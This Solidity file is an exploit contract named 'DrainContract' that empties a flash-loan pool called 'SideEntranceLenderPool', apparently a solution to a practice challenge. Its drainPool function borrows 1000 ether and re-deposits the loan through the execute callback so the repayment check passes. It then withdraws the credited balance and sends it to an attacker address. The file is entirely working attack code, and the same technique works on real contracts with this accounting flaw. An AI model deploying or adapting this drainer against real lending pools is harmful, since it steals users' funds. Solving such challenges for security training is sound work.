pragma solidity 0.8.12;

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract DrainContract {
        
    SideEntranceLenderPool public immutable sideEntranceLenderPool;
    address payable attacker;

    constructor(address payable _attacker, address lenderAddress){
        sideEntranceLenderPool = SideEntranceLenderPool(lenderAddress);
        attacker = _attacker;
    }


    receive() external payable {}

    function drainPool() public {
        sideEntranceLenderPool.flashLoan(1000 ether);
        sideEntranceLenderPool.withdraw();
        attacker.send(1000 ether);
    }

    function execute() external payable {
        sideEntranceLenderPool.deposit{value: msg.value}();
    }
}